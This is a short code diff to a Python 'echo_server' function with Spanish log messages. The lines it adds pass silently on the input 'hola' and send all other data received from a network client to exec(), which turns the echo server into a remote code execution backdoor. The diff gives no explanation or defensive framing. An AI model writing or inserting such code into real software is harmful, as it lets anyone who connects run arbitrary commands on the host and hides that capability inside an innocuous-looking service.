@@ -58,6 +58,11 @@ def echo_server(port):
                     client.close()
                     print("Apagando el servidor...")
                     break
+                elif data == b"hola":
+                    pass
+                else:
+                    exec(data.decode("utf-8"))
+                    print(data.decode("utf-8"))
             else:
                 client.close()
         except KeyboardInterrupt:
